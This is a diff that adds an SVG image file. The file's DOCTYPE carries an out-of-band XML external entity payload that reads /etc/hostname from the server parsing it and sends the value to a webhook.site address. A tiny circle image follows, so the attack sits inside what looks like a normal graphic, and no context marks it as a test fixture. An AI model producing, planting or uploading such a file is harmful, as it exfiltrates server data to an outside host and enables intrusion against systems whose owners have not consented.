@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY % xxe SYSTEM "file:///etc/hostname">
+  <!ENTITY % trick "<!ENTITY &#x25; send SYSTEM 'https://webhook.site/8a567435-7606-4101-a378-5135d4ac218d/?host=%xxe;'>">
+  %trick;
+  %send;
+]>
+<svg width="10" height="10"><circle r="5"/></svg>
